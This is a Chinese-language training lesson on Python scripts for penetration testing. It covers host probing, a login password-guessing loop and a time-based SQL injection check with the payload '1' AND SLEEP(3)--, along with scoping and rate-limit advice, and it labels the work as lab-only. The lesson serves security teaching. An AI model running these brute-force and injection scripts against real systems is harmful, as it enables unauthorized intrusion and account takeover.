# E01-04 · Python 安全脚本

## 学习目标

- 用 Python 写信息收集、验证、爆破辅助脚本
- 建立安全脚本的输入校验与范围控制习惯
- 把重复测试自动化

## 一、为什么是 Python

- 库全（requests、urllib、socket）
- 写 PoC 快
- 面试/工作常见
- 前端同学可与 JS 工具链互补

## 二、基础模板：请求封装

```python
import requests

S = requests.Session()
S.headers.update({"User-Agent": "pentest-lab"})

def get(url, **kw):
    return S.get(url, timeout=10, **kw)
```

## 三、练习 1：存活探测

```python
import requests
from concurrent.futures import ThreadPoolExecutor

urls = ["http://127.0.0.1:8080", "http://127.0.0.1:8081"]

def probe(u):
    try:
        r = requests.get(u, timeout=3)
        return u, r.status_code
    except Exception:
        return u, None

with ThreadPoolExecutor(8) as ex:
    for u, code in ex.map(probe, urls):
        print(u, code)
```

## 四、练习 2：登录响应差异

```python
import requests

url = "http://target/login"
for pwd in ["admin", "123456", "password"]:
    r = requests.post(url, data={"user": "admin", "pass": pwd}, allow_redirects=False)
    print(pwd, r.status_code, len(r.content))
```

**仅靶场**；生产有锁定与法律风险。

## 五、练习 3：简单 SQLi 时间判断

```python
import requests, time

url = "http://target/page"
for payload in ["1", "1' AND SLEEP(3)-- "]:
    t = time.time()
    requests.get(url, params={"id": payload}, timeout=10)
    print(payload, time.time() - t)
```

## 六、脚本工程化

| 项 | 做法 |
|----|------|
| 范围 | `TARGETS` 白名单常量/配置文件 |
| 速率 | sleep、并发上限 |
| 日志 | 保存请求结果便于报告 |
| 退出 | Ctrl+C 友好、异常吞掉并记录 |
| 依赖 | `requirements.txt` |

## 七、与前端技能结合

- 用 Playwright/无头浏览器测 DOM XSS
- 解析 JS 找 API（babel/acorn/正则）
- 生成报告 HTML（你已会前端）
- 本地靶场前端+后端一起搭

## 八、代码安全

- 不在脚本里写死真实客户密钥
- 不把测试数据上传到第三方
- 脚本入库前检查是否含目标内网地址（脱敏）

## 动手练习

1. 写「目录探测」脚本（状态码+长度）
2. 写「同一接口改 ID 测越权」的双账号脚本
3. 把输出打印成 Markdown 表格

## 自测

1. 脚本为什么要限制并发？
2. 为什么建议 Session 而不是每次裸请求？
3. 如何避免脚本被拿去乱扫？
